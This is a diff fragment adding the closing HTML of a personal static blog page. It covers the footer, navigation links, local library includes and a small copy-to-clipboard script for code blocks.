+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    Jeongwon Jo
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects_url">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
